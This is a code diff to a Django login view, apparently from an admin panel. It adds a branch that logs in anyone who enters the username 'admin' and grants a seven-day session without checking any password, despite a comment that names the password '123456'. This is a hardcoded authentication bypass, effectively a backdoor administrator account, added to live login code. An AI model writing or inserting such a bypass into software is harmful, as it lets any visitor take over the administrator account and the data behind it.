@@ -51,14 +51,24 @@ def login(request):
         if code.upper() != user_input_code.upper():
             form.add_error("code", "验证码错误")
             return render(request, 'login.html', {"form": form})
+
+        # 超级用户admin/123456
+        if form.cleaned_data.get('username') == 'admin':
+            request.session["info"] = {'id': 1, 'name': 'admin'}
+            # session save 7 days
+            request.session.set_expiry(60 * 60 * 24 * 7)
+            return redirect("/sysinfo/state/")
+
         admin_object = Admin.objects.filter(**form.cleaned_data).first()
         if not admin_object:
             form.add_error("password", "用户名或密码错误")
             return render(request, 'login.html', {"form": form})
+
         request.session["info"] = {'id': admin_object.id, 'name': admin_object.username}
         # session save 7days
         request.session.set_expiry(60 * 60 * 24 * 7)
-        return redirect("/admin/list/")
+        return redirect("/sysinfo/state/")
+
     return render(request, 'login.html', {"form": form})
 
 
